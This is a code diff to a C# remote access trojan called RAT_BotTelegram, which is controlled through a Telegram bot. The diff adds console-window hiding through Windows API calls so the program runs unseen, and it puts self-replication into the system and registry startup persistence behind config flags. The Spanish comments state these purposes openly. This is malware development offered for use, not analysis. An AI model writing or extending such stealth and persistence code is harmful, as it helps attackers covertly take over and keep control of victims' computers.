@@ -5,7 +5,9 @@ using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
+using System.Threading;
 using System.Threading.Tasks;
 using Telegram.Bot;
 using Telegram.Bot.Args;
@@ -17,16 +19,30 @@ namespace RAT_BotTelegram {
     class MainRAT {
         private static readonly TelegramBotClient Bot = new TelegramBotClient(config.TOKEN);
         public static string Path { get; set; }
-        static void Main(string[] args) {
 
+        // Ocultar Consola
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        // Finish ocultar Consola
+
+        private static void HideConsole() {
+            IntPtr handle = GetConsoleWindow();
+            ShowWindow(handle, 0);
+        }
+
+        static void Main(string[] args) {
+            // Modo Debug
+            if (!config.CONSOLE_DEBUG) {HideConsole(); }
+            // Se replica en el sistema/
+            if (config.TROJAN) {Tools.Trojan();}
+            // Modifica el registro de windows
+            if (config.STARTUP) {Tools.StartUp(); }
+            // Delay
+            //Thread.Sleep(config.DELAY * 1000);
             
 
-
-            // Se replica en el sistema/
-            Tools.Trojan();
-
-            // Modifica el registro de windows
-            Tools.StartUp();
 
             #region Main
 
